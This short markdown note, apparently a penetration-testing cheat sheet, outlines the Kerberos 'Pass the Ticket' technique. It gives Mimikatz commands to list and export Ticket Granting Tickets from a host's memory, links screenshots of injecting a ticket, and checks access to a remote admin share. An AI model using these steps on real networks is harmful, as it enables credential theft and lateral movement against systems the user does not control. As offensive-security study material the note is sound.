
# Pass the Ticket

firstly administrator should RDP to remote host so TGT will be stored inside memory

Check for Ticket Granting Ticket inside memory

	sekurlsa::tickets
	

![image](https://user-images.githubusercontent.com/13157446/130322640-4a7ede43-c670-4c46-8495-ac120415c3e2.png)

	
Export tickets

	Sekurlsa::tickets /export


inject TGT the memory and open cmd

![image](https://user-images.githubusercontent.com/13157446/130322674-610de4dc-5998-4fd1-ab96-d3807741f8b5.png)



check current tickets

![image](https://user-images.githubusercontent.com/13157446/130322696-6d6da2c7-0982-4650-994a-f2bed7f6fc94.png)


check you access

	dir \\odin\c$\


![image](https://user-images.githubusercontent.com/13157446/130322707-c5e5d93c-cf17-46f7-9b08-a675ec60a83d.png)
